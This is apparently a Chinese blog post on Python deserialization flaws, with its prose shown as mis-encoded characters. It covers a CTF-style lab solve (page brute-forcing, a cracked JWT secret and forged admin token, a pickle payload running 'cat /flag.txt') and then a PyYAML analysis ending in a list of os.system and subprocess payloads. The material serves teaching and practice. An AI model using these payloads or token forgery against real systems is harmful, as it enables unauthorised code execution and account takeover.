<p>ç›´æ¥å¯»æ‰¾lv6åœ¨å“ªé‡Œï¼Œç®€å•çš„ç¿»äº†å‡ é¡µï¼Œå‘ç°å¹¶æ— lv6ï¼Œä¸”urlæœ‰pageä¼ å‚ï¼Œæ—¢ç„¶è¿™ä¹ˆä¸å¥½æ‰¾ï¼Œé‚£å°±å†™ä¸ªè„šæœ¬è¯•ä¸€è¯•</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#coding: utf-8</span>

<span class="token keyword">import</span> requests



<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	url <span class="token operator">=</span> <span class="token string">"http://192.168.1.191:8083/shop?page=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
	r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
		<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
		<span class="token keyword">break</span></code></pre>

<p>è¿è¡Œæ‰¾åˆ°lv6å­˜åœ¨181é¡µ</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151603695.png" alt="image-20210222151603695" loading="lazy"></p>
<p>è¯·æ±‚ä¹‹åå‘ç°è¿™ç©æ„ç¡®å®æ˜¯ä¸€ä¸ªå¤©ä»·å‘€ï¼Œä¹°ä¸èµ·ä¹°ä¸èµ·</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151706568.png" alt="image-20210222151706568" loading="lazy"></p>
<p>è´­ä¹°æ—¶ï¼ŒæŠ“åŒ…å°è¯•ä¿®æ”¹ä»·æ ¼ï¼Œå°†ä»·æ ¼æˆ–æŠ˜æ‰£éƒ½ä¿®æ”¹ä¸º0ï¼Œå‘ç°éƒ½ä¼šæ˜¾ç¤ºæ“ä½œå¤±è´¥</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151902135.png" alt="image-20210222151902135" loading="lazy"></p>
<p>è¿™è¾¹å°è¯•å¦ä¸€ç§æ–¹å¼ï¼Œæ”¹å˜ä»·æ ¼ï¼ŒæŠŠæŠ˜æ‰£ä¿®æ”¹åˆ°æœ€å°ï¼Œå‘ç°æˆåŠŸæœ‰è·³è½¬ï¼Œä½†æ˜¯è¿”å›ä¿¡æ¯æç¤ºéœ€è¦adminæƒé™</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222152104854.png" alt="image-20210222152104854" loading="lazy"></p>
<h3 id="JWTä¼ªé€ "><a href="#JWTä¼ªé€ " class="headerlink" title="JWTä¼ªé€ "></a>JWTä¼ªé€ </h3><p>è¿™è¾¹æˆ‘ä»¬å›åˆ°æœ€åˆçš„è¯·æ±‚å¤´å†…ï¼Œæˆ‘ä»¬å‘ç°åœ¨cookieå­—æ®µä¸­å­˜åœ¨JWTå­—æ®µï¼Œæ—¢ç„¶éœ€è¦adminæƒé™ï¼Œé‚£è¿™è¾¹æˆ‘ä»¬èƒ½æƒ³åˆ°çš„å°±æ˜¯ä½¿ç”¨jwtä¼ªé€ </p>
<p>é¦–å…ˆæˆ‘ä»¬å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯jwtï¼Ÿ</p>
<p><code>JSON Web Token (JWT)</code>æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†(RFC 7519)ï¼Œå®ƒå®šä¹‰äº†ä¸€ç§ç´§å‡‘çš„ã€è‡ªåŒ…å«çš„æ–¹å¼ï¼Œç”¨äºä½œä¸ºJSONå¯¹è±¡åœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯å¯ä»¥è¢«éªŒè¯å’Œä¿¡ä»»ï¼Œå› ä¸ºå®ƒæ˜¯æ•°å­—ç­¾åçš„ã€‚</p>
<p><code>JSON Web Token</code>ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå®ƒä»¬ä¹‹é—´ç”¨åœ†ç‚¹(.)è¿æ¥ã€‚è¿™ä¸‰éƒ¨åˆ†åˆ†åˆ«æ˜¯ï¼šHeaderPayloadSignature</p>
<p>JWTä¸Sessionçš„å·®å¼‚</p>
<p>ç›¸åŒç‚¹æ˜¯ï¼Œå®ƒä»¬éƒ½æ˜¯å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼›ç„¶è€Œï¼ŒSessionæ˜¯åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œè€ŒJWTæ˜¯åœ¨å®¢æˆ·ç«¯çš„ã€‚Sessionæ–¹å¼å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æœ€å¤§é—®é¢˜åœ¨äºè¦å ç”¨å¤§é‡æœåŠ¡å™¨å†…å­˜ï¼Œå¢åŠ æœåŠ¡å™¨çš„å¼€é”€ã€‚è€ŒJWTæ–¹å¼å°†ç”¨æˆ·çŠ¶æ€åˆ†æ•£åˆ°äº†å®¢æˆ·ç«¯ä¸­ï¼Œå¯ä»¥æ˜æ˜¾å‡è½»æœåŠ¡ç«¯çš„å†…å­˜å‹åŠ›ã€‚Sessionçš„çŠ¶æ€æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå®¢æˆ·ç«¯åªæœ‰session idï¼›è€ŒTokençš„çŠ¶æ€æ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ã€‚</p>
<p>ä½¿ç”¨å·¥å…·<code>https://jwt.io/</code>è¿›è¡ŒjwtåŠ è§£å¯†</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222153543892.png" alt="image-20210222153543892" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°ç¡®å®è¿™æ®µcookieä¸­å­˜æ”¾äº†å½“å‰ç™»å½•ç”¨æˆ·çš„ç”¨æˆ·ä¿¡æ¯</p>
<p>é‚£ä¹ˆä¸€æ¬¡æ¥ä¼ªé€ adminçš„jwtçš„å€¼</p>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>æ¥è·‘å¯†é’¥</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222153723888.png" alt="image-20210222153723888" loading="lazy"></p>
<p>è·‘å‡ºæ¥ç§˜é’¥ä¸º<code>1Kun</code></p>
<p>å¸¦å…¥è·å–adminå€¼<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></p>
<p>ä¿®æ”¹jwtå€¼ï¼Œæ“ä½œæˆåŠŸï¼Œè·å–åˆ°ä¸€ä¸ªæºç å‹ç¼©åŒ…è·¯å¾„<code>/static/asd1f654e683wq/www.zip</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154330095.png" alt="image-20210222154330095" loading="lazy"></p>
<h3 id="pickleååºåˆ—åŒ–"><a href="#pickleååºåˆ—åŒ–" class="headerlink" title="pickleååºåˆ—åŒ–"></a>pickleååºåˆ—åŒ–</h3><p>è¯·æ±‚å‹ç¼©åŒ…ï¼Œè·å–åˆ°æºç å†…å®¹ï¼Œåœ¨æºç <code>Admin.py</code>ä¸­å­˜åœ¨å¦‚ä¸‹pickleååºåˆ—åŒ–ä»£ç </p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154718086.png" alt="image-20210222154718086" loading="lazy"></p>
<p>æŠ“å–åˆ°becomeå˜é‡é¡µé¢ï¼Œç¼–å†™payloadçš„è„šæœ¬</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#coding: utf-8</span>

<span class="token keyword">import</span> pickle
<span class="token keyword">import</span> commands
<span class="token keyword">import</span> urllib

<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""cat /flag.txt"""</span>  <span class="token comment">#è¦æ‰§è¡Œçš„å‘½ä»¤</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span>commands<span class="token punctuation">.</span>getoutput<span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#os.system("echo test >poc.txt")</span>

e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222161340815.png" alt="image-20210222161340815" loading="lazy"></p>
<h2 id="PyYamlæ¨¡å—è¯¦è§£"><a href="#PyYamlæ¨¡å—è¯¦è§£" class="headerlink" title="PyYamlæ¨¡å—è¯¦è§£"></a>PyYamlæ¨¡å—è¯¦è§£</h2><h3 id="PyYamlåŸºç¡€"><a href="#PyYamlåŸºç¡€" class="headerlink" title="PyYamlåŸºç¡€"></a>PyYamlåŸºç¡€</h3><p>YAMLæ˜¯ä¸€ç§ç›´è§‚çš„èƒ½å¤Ÿè¢«ç”µè„‘è¯†åˆ«çš„çš„æ•°æ®åºåˆ—åŒ–æ ¼å¼ï¼Œå®¹æ˜“è¢«äººç±»é˜…è¯»ï¼Œå¹¶ä¸”å®¹æ˜“å’Œè„šæœ¬è¯­è¨€äº¤äº’ï¼ŒYAMLç±»ä¼¼äºXMLï¼Œä½†æ˜¯è¯­æ³•æ¯”XMLç®€å•å¾—å¤šï¼Œå¯¹äºè½¬åŒ–æˆæ•°ç»„æˆ–å¯ä»¥hashçš„æ•°æ®æ—¶æ˜¯å¾ˆç®€å•æœ‰æ•ˆçš„ã€‚</p>
<ul>
<li>å¤§å°å†™æ•æ„Ÿ</li>
<li>ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»</li>
<li>ç¼©è¿›æ—¶ä¸å…è®¸ä½¿ç”¨Tabï¼Œåªå…è®¸ä½¿ç”¨ç©ºæ ¼</li>
<li>ç¼©è¿›çš„ç©ºæ ¼æ•°ç›®ä¸é‡è¦ï¼Œåªè¦ç›¸åŒå±‚çº§çš„å…ƒç´ å·¦å¯¹é½å³å¯</li>
<li>â€˜#â€™è¡¨ç¤ºæ³¨é‡Šï¼Œä»å®ƒå¼€å§‹åˆ°è¡Œå°¾éƒ½è¢«å¿½ç•¥</li>
</ul>
<pre class="language-none"><code class="language-none">yaml.load() : Python PyYAML åº“ç‰ˆæœ¬ &lt; 5.1b1
yaml.unsafe_load() : Python PyYAML åº“ç‰ˆæœ¬ &gt;&#x3D; 5.1b1</code></pre>



<h3 id="PyYamlä¸­çš„æ ¼å¼"><a href="#PyYamlä¸­çš„æ ¼å¼" class="headerlink" title="PyYamlä¸­çš„æ ¼å¼"></a>PyYamlä¸­çš„æ ¼å¼</h3><ul>
<li>yamlè½¬å­—å…¸</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>

<span class="token keyword">import</span> yaml

data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
name: greetdawn
age: 19
job: Player
"""</span>

a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093503733.png" alt="image-20210223093503733" loading="lazy"></p>
<ul>
<li>yamlè½¬åˆ—è¡¨</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>

<span class="token keyword">import</span> yaml

data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- greetdawn
- 19
- Player
"""</span>

a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093654970.png" alt="image-20210223093654970" loading="lazy"></p>
<ul>
<li>å¤åˆç»“æ„ç±»å‹</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>

<span class="token keyword">import</span> yaml

data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- name: greetdawn
  age: 18
  job: teacher
- name: zhangsan
  age: 40
  job: player
"""</span>

a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223094845756.png" alt="image-20210223094845756" loading="lazy"></p>
<ul>
<li>çº¯é‡å’Œæ ‡é‡</li>
</ul>
<p> å½“å­—ç¬¦ä¸²ä¸­ä¸åŒ…å«ç©ºæ ¼æˆ–è€…ç‰¹æ®Šå­—ç¬¦æ—¶ , å¯ä»¥ä¸åŠ å¼•å· . å¦‚æœå­—ç¬¦ä¸²ä¸­åŒ…å«ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦ , å°±è¦ä½¿ç”¨å¼•å· . ä½†éœ€è¦æ³¨æ„ , å•å¼•å·ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ , åŒå¼•å·ä¸ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ .</p>
<ul>
<li>å¼ºåˆ¶ç±»å‹è½¬æ¢</li>
</ul>
<p>å•ä¸ªæ„Ÿå¹å·( ! )é€šå¸¸ç”¨äºå¼ºåˆ¶è½¬æ¢ä¸ºè‡ªå®šä¹‰ç±»å‹ , è€Œä¸¤ä¸ªæ„Ÿå¹å·( !! )é€šå¸¸ç”¨äºå¼ºåˆ¶è½¬æ¢ä¸ºå†…ç½®ç±»å‹ . </p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>

<span class="token keyword">import</span> yaml

data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
 string: !!str 3.1415926
 int: !!int "123456"
"""</span>

a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223100750055.png" alt="image-20210223100750055" loading="lazy"></p>
<h3 id="PyYamlååºåˆ—åŒ–æ¼æ´åˆ†æ"><a href="#PyYamlååºåˆ—åŒ–æ¼æ´åˆ†æ" class="headerlink" title="PyYamlååºåˆ—åŒ–æ¼æ´åˆ†æ"></a>PyYamlååºåˆ—åŒ–æ¼æ´åˆ†æ</h3><ul>
<li>pyyamlçš„å¯¹è±¡è½¬åŒ–è§„åˆ™</li>
</ul>
<p><code>%PYTHON-HOME%/Lib/site-packages/yaml/constructor.py</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111223199.png" alt="image-20210223111223199" loading="lazy"></p>
<p>åœ¨æºç ä¸­æˆ‘ä»¬é‡ç‚¹å…³æ³¨è¿™ä¸ªä¸‰ä¸ªç‰¹æ®Šçš„è½¬æ¢è§„åˆ™</p>
<ul>
<li>construct_python_object()</li>
</ul>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111525518.png" alt="image-20210223111525518" loading="lazy"></p>
<ul>
<li>construct_python_object_apply()</li>
</ul>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111626157.png" alt="image-20210223111626157" loading="lazy"></p>
<ul>
<li>construct_python_object_new()</li>
</ul>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223112357209.png" alt="image-20210223112357209" loading="lazy"></p>
<p>æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„å‘ç°ï¼Œè¿™ä¸‰ä¸ªå‡½æ•°éƒ½è°ƒç”¨äº†å‡½æ•°self.make_python_instance()è¿™ä¸ªå‡½æ•°ï¼Œè®©æˆ‘ä»¬æ¥ä¸€èµ·è·Ÿè¸ªä¸€ä¸‹è¯¥å‡½æ•°ï¼š</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223112541297.png" alt="image-20210223112541297" loading="lazy"></p>
<p>è¯¥å‡½æ•°çš„é€»è¾‘æ˜¯è°ƒç”¨äº†<code>find_python_name()</code>å‡½æ•°ï¼Œå¹¶ä¸”æ‰§è¡Œçš„ç»“æœèµ‹å€¼ç»™clså˜é‡ï¼Œä¹‹ååˆå°†å˜é‡clsçš„å€¼ä½œä¸ºå‡½æ•°åï¼Œè°ƒç”¨è¯¥å‡½æ•°å¹¶å°†æ‰§è¡Œç»“æœè¿”å›ï¼›</p>
<p>è¿™ç§å°†è¿”å›å€¼ä½œä¸ºå‡½æ•°åå¹¶è°ƒç”¨è¯¥å‡½æ•°çš„ç¼–ç¨‹æ–¹å¼æä¸ºå±é™©ï¼Œè¿™é‡Œå¦‚æœç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶è¢«è°ƒç”¨å‡½æ•°çš„å‡½æ•°ååŠå‚æ•°çš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ä»£ç çš„ä»»æ„æ‰§è¡Œï¼›</p>
<p>è¿™è¾¹æˆ‘ä»¬ç»§ç»­è·Ÿè¿›<code>find_python_name()</code>å‡½æ•°</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223163820292.png" alt="image-20210223163820292" loading="lazy"></p>
<p>æ ¹æ®ä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå‡è®¾ä¼ å…¥å˜é‡nameçš„å‚æ•°ä¸ºos.system()ï¼Œé¦–å…ˆä¼šå°è¯•å¯¼å…¥osæ¨¡å—ï¼Œç„¶åå†åˆ¤æ–­osæ¨¡å—ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å¯¹è±¡(system),å¦‚æœè¯¥å¯¹è±¡å­˜åœ¨å°±å°†è¯¥å¯¹è±¡è¿”å›ã€‚</p>
<p>å½“å‡½æ•°è¿”å›åï¼Œpythonä¼šåŠ¨æ€è°ƒç”¨è¯¥å‡½æ•°ï¼Œé‚£ä¹ˆç”¨æˆ·è¾“å…¥çš„æ¶æ„æŒ‡ä»¤ä¼šè¢«æ‹¼æ¥åˆ°åŠ¨æ€è°ƒç”¨çš„å‡½æ•°ä¸­</p>
<p>ç®€å•çš„å°ä¾‹å­</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>

<span class="token keyword">import</span> os

<span class="token keyword">class</span> <span class="token class-name">Poc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
		
obj <span class="token operator">=</span> Poc1<span class="token punctuation">(</span><span class="token punctuation">)</span>
cls <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"shell"</span><span class="token punctuation">)</span>
cls<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223165835716.png" alt="image-20210223165835716" loading="lazy"></p>
<h3 id="PyYamlååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"><a href="#PyYamlååºåˆ—åŒ–æ¼æ´åˆ©ç”¨" class="headerlink" title="PyYamlååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"></a>PyYamlååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</h3><ul>
<li>æœ€åŸºæœ¬æ¡ä»¶ï¼Œé¦–å…ˆè¦è®© PyYAML èƒ½å¤Ÿè§£æåºåˆ—åŒ–å­—ç¬¦ä¸² , æ‰€ä»¥è¦ä½¿ç”¨ <code>!!python</code> è¿™ä¸ªæ ‡ç­¾( <code>!!python/object</code> , <code>!!python/object/apply</code> , <code>!!python/object/new</code>éƒ½å¯ä»¥ )</li>
<li>ååºåˆ—åŒ–çš„è¿‡ç¨‹å®é™…ä¸Šæ˜¯ç±»å®ä¾‹åŒ–çš„è¿‡ç¨‹ . åªæœ‰è¢«å®ä¾‹åŒ–çš„ç±»ä¸­åŒ…å«å‡½æ•° , ä¸”å‡½æ•°ä¸­åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç æ—¶ , æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰æœ‰å¯èƒ½è¢«è°ƒç”¨æ‰§è¡Œ</li>
<li>æ™®é€šæ•°æ®ç±»å‹( å­—ç¬¦ä¸² , åˆ—è¡¨ , å…ƒç»„ , å­—å…¸ )çš„ååºåˆ—åŒ–è¿‡ç¨‹æ˜¯çº¯é‡åˆå§‹åŒ– , èµ‹å€¼çš„è¿‡ç¨‹ï¼Œä¸ä¼šæ¶‰åŠåˆ°è´Ÿè´£é€»è¾‘å¤„ç†çš„ä»£ç å—ï¼Œä¹Ÿå°±ä¸ä¼šæœ‰ä»£ç è¢«è°ƒç”¨æ‰§è¡Œ .</li>
<li>å› æ­¤ , æˆ‘ä»¬éœ€è¦å¯¼å…¥ä¸€ä¸ªç±» , è¿™ä¸ªç±»å­˜åœ¨ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„å‡½æ•° , ä¸”è¯¥å‡½æ•°ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ . æˆ‘ä»¬å°†è¿™ä¸ªç±»åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸² , å†æŠŠè¿™ä¸ªå­—ç¬¦ä¸²æäº¤ç»™ PyYAML è§£ææ‰§è¡Œ .</li>
</ul>
<h3 id="å¸¸ç”¨payloadæ±‡æ€»"><a href="#å¸¸ç”¨payloadæ±‡æ€»" class="headerlink" title="å¸¸ç”¨payloadæ±‡æ€»"></a>å¸¸ç”¨payloadæ±‡æ€»</h3><pre class="language-python" data-language="python"><code class="language-python">!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span>calc<span class="token punctuation">.</span>exe<span class="token punctuation">]</span><span class="token punctuation">]</span>
!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span>
!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>os<span class="token punctuation">.</span>system <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span>
!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span>os<span class="token punctuation">.</span>system <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span></code></pre>



</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="æ‰“èµ" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">é’±æ˜¯ä¸‡èƒ½çš„</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-wechat.png"><img loading="lazy" src="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-wechat.png" alt="æ”¯ä»˜å®" title="æ”¯ä»˜å®"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-alipay.png"><img loading="lazy" src="https://gitee.com/greetdawn/blogImages/raw/master/img/qr-alipay.png" alt="å¾®ä¿¡æ”¯ä»˜" title="å¾®ä¿¡æ”¯ä»˜"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>ä¸¨Mr.zhangä¸¨</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://www.greetdawn.top/2021/02/24/python-code-audit/python-unserialize/" title="pythonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–">http://www.greetdawn.top/2021/02/24/python-code-audit/python-unserialize/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> è®¸å¯åè®®ã€‚</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/03/17/devops-tools/win-changeip-tool/" rel="prev" title="windowsä¸‹ipä¿®æ”¹å°å…¬ä¸¾"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">windowsä¸‹ipä¿®æ”¹å°å…¬ä¸¾</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/02/20/security/shell-reverse/" rel="next" title="å¸¸è§shellåå¼¹å§¿åŠ¿"><span class="post-nav-text">å¸¸è§shellåå¼¹å§¿åŠ¿</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å°è¯•ä½¿ç”¨ Disqus è¯„è®ºç³»ç»Ÿã€‚</span><br><span>æ‚¨å¯ä»¥ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®åˆ‡æ¢å¯¹åº”è¯„è®ºç³»ç»Ÿã€‚</span><br><a class="hty-button hty-button--raised" id="github-issues" target="_blank" rel="noopener" href="https://github.com/greetdawn/greetdawn.github.io/issues?q=is:issue+pythonåºåˆ—åŒ–ä¸ååºåˆ—åŒ–">GitHub Issues</a></div><div class="toggle-comment-system" style="margin: 1rem auto"><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#valine-container" onclick="showComment(this.dataset.target)">valine</a><style>#disqus_thread {
  display: none;
}</style><a class="toggle-comment-btn hty-button hty-button--raised text-uppercase" data-target="#disqus_thread" onclick="showComment(this.dataset.target)">disqusjs</a><script>function hideAllComment() {
  //- hide all
  document.querySelectorAll('.toggle-comment-btn').forEach((btn) => {
    const container = document.querySelector(btn.dataset.target);
    if (container) {
      container.style.display = "none";
    }
  });
}
function showComment(target) {
  hideAllComment();
  //- show target
  const targetContainer = document.querySelector(target);
  if (targetContainer) {
    targetContainer.style.display = "block";
  }
}
